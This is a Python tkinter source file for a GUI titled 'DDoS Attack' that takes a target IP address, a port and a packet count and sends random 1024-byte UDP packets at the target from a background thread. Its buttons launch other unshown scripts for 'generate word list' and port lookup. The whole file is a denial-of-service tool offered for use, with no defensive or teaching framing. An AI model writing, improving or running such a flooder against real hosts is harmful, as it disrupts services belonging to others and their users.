import tkinter as tk
import socket
import random
import time
from tkinter import *
from tkinter import simpledialog,messagebox
import threading
from tkinter import scrolledtext
entry_text = int(simpledialog.askstring("Entry Box", "Enter a value:"))
def send_packet(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytearray(random.getrandbits(8) for _ in range(1024))

    try:
        sock.sendto(payload, (target_ip, target_port))
        response_text.insert(tk.END, "Packet sent successfully.\n")
    except socket.error as e:
        response_text.insert(tk.END, f"An error occurred while sending the packet: {e}\n")
    finally:
        sock.close()

def start_attack():
    def startsing():
        target_ip = ip_entry.get()
        target_port = int(port_entry.get())
        
        for i in range(entry_text):
            send_packet(target_ip, target_port)
            time.sleep(random.uniform(0.1, 0.5))
    threading.Thread(target=startsing).start()
    

window = tk.Tk()
window.title("DDoS Attack")
window.iconbitmap("download.ico")

window.geometry("700x500+410+100")
leftframe = Frame(window,background="whitesmoke")
leftframe.place(x=0,y=0,width=300,height=500)
imagese = PhotoImage(file="images1.png")
Labels = Label(leftframe,image=imagese)
Labels.place(x=0,y=0,width=300,height=260)
frames = Frame(leftframe,background="white")
frames.place(x=0,y=280,width=300,height=220)
def exits():
    window.destroy()
def opengenerate():
    exits()
    import subprocess
    subprocess.Popen(["python","files.py"])
def opencheker():
    import subprocess
    exits()
    subprocess.Popen(["python","getport.py"])

buttongenerate = Button(leftframe,text="generate word list",fg="white",bg="red",cursor="hand2",command=opengenerate)
buttongenerate.place(x=0,y=240,width=300,height=40)
# get port and shecks the data
buttonport = Button(leftframe,text="Get port",fg="white",bg="royalblue",cursor="hand2",command=opencheker)
buttonport.place(x=0,y=200,width=300,height=40)
# IP Address Label and Entry
ip_label = tk.Label(frames, text="Enter the target IP address:",fg="black",bg="white")
ip_label.place(x=10,y=20)
ip_entry = tk.Entry(frames)
ip_entry.place(x=10,y=50,width=220,height=30)
port_label = tk.Label(frames, text="Enter the target port:",fg="black",bg="white")
port_label.place(x=10,y=90)
port_entry = tk.Entry(frames)
port_entry.place(x=10,y=120,width=220,height=30)
start_button = tk.Button(frames, text="Start Attack", command=start_attack,fg="white",bg="red",cursor="hand2")
start_button.place(x=10,y=157,width=220,height=30)
# open another apps button
def openapps():
    import subprocess
    import time
    messagebox.showinfo("success","sure")
    time.sleep(2)
    window.destroy()
    subprocess.Popen(['python','getipd.py'])
    
start_buttons = tk.Button(frames, text="open ne", command=openapps,fg="white",bg="#111",cursor="hand2")
start_buttons.place(x=10,y=187,width=220,height=30)
response_text = tk.Text(window,padx=20,pady=20)
response_text.place(x=300,y=0,width=400,height=500)
window.resizable(FALSE,FALSE)
window.mainloop()
